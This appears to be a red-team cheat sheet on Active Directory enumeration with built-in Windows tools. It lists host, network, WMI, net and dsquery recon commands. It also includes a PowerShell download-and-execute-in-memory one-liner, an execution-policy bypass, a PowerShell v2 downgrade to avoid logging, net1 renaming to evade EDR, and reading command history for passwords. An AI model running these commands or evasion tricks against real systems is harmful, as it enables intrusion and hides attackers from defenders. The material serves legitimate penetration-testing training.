# Living Off the Land (LOTL) — AD Enumeration with Built-in Tools Only
*(No internet access, no way to load tools — native Windows/AD binaries only. Also useful purely for stealth, since fewer imported tools = fewer alerts.)*

---

## 1. Quick Host Recon

| Command | Result |
|---|---|
| `hostname` | PC's name |
| `[System.Environment]::OSVersion.Version` | OS version/revision |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Installed patches/hotfixes |
| `ipconfig /all` | Network adapter config |
| `set` | Env variables (CMD) |
| `echo %USERDOMAIN%` | Domain the host belongs to |
| `echo %logonserver%` | DC the host checks in with |

**One-shot summary (fewer logs than running each command separately):**
```cmd
systeminfo
```

**Check if you're alone on the host before doing anything noisy:**
```powershell
qwinsta
```
Other active sessions = risk of being noticed (popups, forced logoffs, password changes).

---

## 2. PowerShell Tricks

| Cmdlet | Description |
|---|---|
| `Get-Module` | Loaded modules |
| `Get-ExecutionPolicy -List` | Policy per scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Bypass for current process only — reverts on exit, no permanent host change |
| `Get-ChildItem Env: \| ft Key,Value` | Env values |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | User's PS command history — can contain passwords, hints at config/script locations |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>')"` | Download + execute from memory |

### PowerShell v2 downgrade (log evasion)
PS logging (Script Block Logging, Event ID 4104) only exists from PS 3.0+. Downgrading to v2 means your subsequent commands stop generating that log:
```powershell
powershell.exe -version 2
```
⚠️ **Check viability first — don't assume this works.** Many modern builds (Windows 10 1803+/Server 2019+) have PowerShell 2.0 removed as an optional feature by default:
```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```
If it's not present, this technique is a dead end — don't waste time attempting it blind.

**It's not invisible.** The downgrade command itself IS logged (one entry showing a new v2.0 session started) — a vigilant defender sees logging stop right after that entry and can connect the dots. Treat this as "reduces logging going forward," not "erases your presence."

**Where to check the logs yourself (to understand what you're hiding from):**
- `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational` (script block content, 4104)
- `Applications and Services Logs > Windows PowerShell` (session start/stop, 400/403)

---

## 3. Checking Defenses

**Firewall profile status:**
```cmd
netsh advfirewall show allprofiles
```

**Defender service status (CMD):**
```cmd
sc query windefend
```

**Defender full config (PowerShell):**
```powershell
Get-MpComputerStatus
```

---

## 4. Network Recon (built-in)

| Command | Description |
|---|---|
| `arp -a` | Known hosts in ARP table |
| `ipconfig /all` | Adapter config → identifies network segment |
| `route print` | Routing table — networks the host is aware of = potential lateral movement targets |
| `netsh advfirewall show allprofiles` | Firewall state |

`arp -a` and `route print` are particularly valuable in black-box engagements where active scanning is limited — these show you what the host already knows about without sending a single probe packet.

---

## 5. WMI (Windows Management Instrumentation)

| Command | Description |
|---|---|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patch level |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Host basics |
| `wmic process list /format:list` | Running processes |
| `wmic ntdomain list /format:list` | Domain + DC info, including child domains and trusts |
| `wmic useraccount list /format:list` | Local + domain accounts that have logged in |
| `wmic group list /format:list` | Local groups |
| `wmic sysaccount list /format:list` | Service/system accounts |

**Domain + forest trust overview in one shot:**
```cmd
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

> Note: `wmic` is deprecated by Microsoft (removed from newer Windows builds going forward) — if it's missing, the PowerShell equivalents are `Get-CimInstance Win32_QuickFixEngineering`, `Get-CimInstance Win32_ComputerSystem`, `Get-Process`, etc. Worth knowing both since you won't always know which the target host still has.

---

## 6. Net Commands

⚠️ **`net.exe` is commonly monitored by EDR** — some orgs alert on `whoami`/`net localgroup administrators` run from unexpected OUs (e.g. a Marketing account suddenly enumerating admin groups). Use deliberately, not as a first reflex on a sensitive host.

| Command | Description |
|---|---|
| `net accounts` | Password requirements |
| `net accounts /domain` | Password + lockout policy |
| `net group /domain` | Domain groups |
| `net group "Domain Admins" /domain` | Domain Admins membership |
| `net group "domain computers" /domain` | Domain-joined PCs |
| `net group "Domain Controllers" /domain` | DC list |
| `net group <group_name> /domain` | Members of a specific group |
| `net localgroup administrators /domain` | Users in local admins — Domain Admins is included by default |
| `net localgroup Administrators` | Local admin group info |
| `net share` | Current shares |
| `net user <account> /domain` | Info on a specific domain user |
| `net user /domain` | All domain users |
| `net user %username%` | Current user info |
| `net use x: \\computer\share` | Mount a share |
| `net view` | List computers |
| `net view /domain` | List PCs in domain |
| `net view \\computer /ALL` | Shares on a specific computer |

**Evasion trick:** `net1` runs identical functions to `net` but as a different binary name — useful if defenders are specifically alerting on the string `net.exe`/`net ` in command-line logging:
```cmd
net1 user /domain
```

---

## 7. dsquery — Native AD Query Tool

Exists on any host with the AD DS role, and the underlying DLL (`C:\Windows\System32\dsquery.dll`) ships on all modern Windows by default. Needs elevated/SYSTEM context or a shell that can load it.

**Basic searches:**
```cmd
dsquery user
dsquery computer
dsquery * "CN=Users,DC=domain,DC=local"
```

**Filtered search — users with `PASSWD_NOTREQD` set (no password required, prime spray target):**
```cmd
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

**Find all Domain Controllers:**
```cmd
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

### LDAP Filter / OID Quick Reference
`userAccountControl:1.2.840.113556.1.4.803:=<value>` — the OID is the match rule, the number after `=` is the UAC bitmask being matched.

| OID | Meaning |
|---|---|
| `1.2.840.113556.1.4.803` | Exact bit match — use for matching one specific UAC attribute |
| `1.2.840.113556.1.4.804` | Match if ANY bit in the chain matches — useful when an object may have multiple attributes set |
| `1.2.840.113556.1.4.1941` | Matches against Distinguished Name — walks the full chain of group membership/ownership |

**Logical operators:** `&` (and), `|` (or), `!` (not)
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))     # AND — password can't change
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))    # NOT — exclude that attribute
```
These same filter strings work across `dsquery`, the AD PowerShell module, and `ldapsearch` — learning the syntax once pays off everywhere.

---

## 8. When to Reach for LOTL vs. Imported Tools

| Situation | Approach |
|---|---|
| No internet access on target, can't transfer tools | LOTL is your only option |
| Stealth matters, Defender/EDR is aggressive | LOTL first — fewer artifacts, blends with normal admin activity |
| Need attack-path graphing (ACLs, nested groups, sessions across hosts) | Nothing native replaces BloodHound — you'll need SharpHound or bloodhound-python eventually |
| Quick situational checks (who's logged in, am I local admin, what's the domain) | LOTL is faster than standing up a whole tool chain |

---

## What changed / efficiency notes vs. the old-school version
- Flagged that **PowerShell v2 downgrade is not guaranteed to work** on modern builds — check `Get-WindowsOptionalFeature` before relying on it instead of assuming it's always available
- Flagged `wmic` as **deprecated by Microsoft** — know the `Get-CimInstance` PowerShell equivalents as a fallback since `wmic` is being phased out of newer builds
- Everything else (dsquery, net/net1, arp/route, systeminfo, qwinsta) is still fully current — these are native OS binaries, not third-party tools, so there's no "modern replacement" to swap in
